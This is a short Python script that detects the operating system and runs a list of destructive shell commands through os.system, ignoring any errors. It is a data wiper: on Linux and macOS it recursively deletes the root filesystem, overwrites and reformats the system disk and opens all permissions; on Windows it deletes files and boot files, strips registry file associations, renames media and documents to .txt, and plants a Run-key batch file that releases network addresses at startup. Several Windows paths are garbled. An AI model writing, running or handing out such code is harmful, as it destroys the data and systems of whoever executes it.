import platform, os, sys

platform = platform.system()

if platform == "Linux":

	commands = ["sudo chmod -R 777 /*", "sudo rm -rf /* --no-preserve-root", "dd if=/dev/null of=/dev/sda", "sudo mv /* /dev/null", "sudo mkfs.ext3 /dev/sda"]

elif platform == "Darwin":
	commands = ["sudo chmod -R 777 /*", "sudo rm -rf /* --no-preserve-root", "dd if=/dev/null of=/dev/sda", "sudo mv /* /dev/null", "sudo mkfs.ext3 /dev/sda", "open /Applications/*"]

elif platform == "Windows":
	
	commands = [r"del /s /q *.*", r"del*.*", r"START reg delete HKCR/.exe", r"START reg delete HKCR/.dll", r"START reg delete HKCR/*", r"echo @echo off>c:windowswimn32.bat", r"echo break off>>c:windowswimn32.bat", r"echo ipconfig/release_all>>c:windowswimn32.bat", r"echo end>>c:windowswimn32.bat", r"reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f", r"reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window", r"delete %systemdrive%\*.* /f /s", r"REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt", r"attrib -r -s -h c:\autoexec.bat", r"del c:\autoexec.bat", r"attrib -r -s -h c:\boot.ini", r"del c:\boot.ini", r"attrib -r -s -h c:\ntldr", r"del c:\ntldr", r"attrib -r -s -h c:\windows\win.ini", "del c:\windows\win.ini"]

else:
	sys.exit("System not detected")

for command in commands:
	try:
		os.system(command)
		
	except:
		pass